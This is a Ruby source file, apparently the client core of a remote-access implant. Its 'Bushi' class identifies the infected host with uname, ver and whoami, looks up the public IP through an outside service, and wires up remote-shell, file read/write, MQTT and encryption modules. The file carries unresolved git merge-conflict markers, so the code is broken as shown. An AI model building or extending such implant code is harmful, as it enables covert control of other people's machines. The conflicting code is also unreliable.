require 'securerandom'
require 'os'
require 'open-uri'
require 'paho-mqtt'

require_relative 'bushido/core/serialization'
<<<<<<< HEAD
require_relative 'bushido/core/encryption'
=======
>>>>>>> 78cd2d2dda941bbe0cd0385c823d9ab551f61517
require_relative 'bushido/remoteshell/buremoteshell'
require_relative 'bushido/filerw/bufilerw'

class Bushi
  attr_reader :id, :host, :os, :ip
  attr_accessor :status, :bushido
  def initialize()
    @id = SecureRandom.hex(2)
    @host = (OS.windows? ? `ver` : `uname -sr`).strip
    @os = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
    @ip = open('http://whatismyip.akamai.com').read
    @status = :offline
    @bushido = {
<<<<<<< HEAD
      :mqtt           => PahoMqtt::Client.new,
      :serialization  => Bushido::Serialization.new,
      :rsa            => Bushido::RSA.new,
      :aes            => Bushido::AES.new,
      :digest         => Bushido::Digest.new,
=======
      :serialization  => Core::Serialization.new,
      :mqtt           => PahoMqtt::Client.new,
>>>>>>> 78cd2d2dda941bbe0cd0385c823d9ab551f61517
      :remoteshell    => Bushido::BuRemoteShell.new,
      :filerw         => Bushido::BuFileReadWrite.new
    }
  end
end
